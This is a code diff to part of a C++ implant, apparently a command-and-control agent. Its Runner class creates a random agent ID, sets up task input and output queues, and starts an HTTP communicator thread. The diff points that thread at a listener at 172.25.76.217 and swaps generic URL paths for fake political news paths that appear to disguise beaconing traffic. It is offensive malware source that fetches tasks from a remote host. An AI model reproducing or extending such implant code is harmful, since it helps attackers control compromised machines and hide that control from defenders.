@@ -13,10 +13,10 @@
 Runner::Runner()
     : winApiCustom(WinApiCustom()),
       pAgentId(NULL),
-      TaskInputQueue(Queue(&winApiCustom, TRUE)),
-      TaskOutputQueue(Queue(&winApiCustom, TRUE)),
-      eventRegister(Event(&winApiCustom)),
-      eventAgentShouldStop(Event(&winApiCustom))
+      TaskInputQueue(Queue()),
+      TaskOutputQueue(Queue()),
+      eventRegister(Event()),
+      eventAgentShouldStop(Event())
 {
     // Generate and set Agent ID
     this->pAgentId = (PCHAR)this->winApiCustom.HeapAllocCustom(7); // 6 characters + 1 null-byte
@@ -25,6 +25,14 @@ Runner::Runner()
         RandomGenerator randomGenerator = RandomGenerator(&this->winApiCustom);
         randomGenerator.GenerateRandomStr(6, this->pAgentId);
     }
+
+    // Setup events
+    this->eventRegister = Event(&winApiCustom);
+    this->eventAgentShouldStop = Event(&winApiCustom);
+
+    // Setup Task Input and Output queues
+    this->TaskInputQueue = Queue(&winApiCustom, TRUE);
+    this->TaskOutputQueue = Queue(&winApiCustom, TRUE);
 }
 
 /* Destructor */
@@ -43,9 +51,9 @@ void Runner::Run()
     // Start Communicator thread
     HttpCommunicatorThreadArgs httpCommunicatorThreadArgs;
     httpCommunicatorThreadArgs.agentId = this->pAgentId;
-    httpCommunicatorThreadArgs.listenerHost = "127.0.0.1";               // CHANGE THIS
-    httpCommunicatorThreadArgs.listenerPort = 8080;                      // CHANGE THIS
-    httpCommunicatorThreadArgs.pUrlPathChoices = "/path1\x00/path2\x00"; // CHANGE THIS
+    httpCommunicatorThreadArgs.listenerHost = "172.25.76.217";                                                                                                                                    // CHANGE THIS
+    httpCommunicatorThreadArgs.listenerPort = 8080;                                                                                                                                               // CHANGE THIS
+    httpCommunicatorThreadArgs.pUrlPathChoices = "/politics/congress-investigates-allegations-of-foreign-interference\x00/politics/new-study-reveals-stark-disparities-in-healthcare-access\x00"; // CHANGE THIS
     httpCommunicatorThreadArgs.pWinApiCustom = &(this->winApiCustom);
     httpCommunicatorThreadArgs.pTaskInputQueue = &(this->TaskInputQueue);
     httpCommunicatorThreadArgs.pTaskOutputQueue = &(this->TaskOutputQueue);
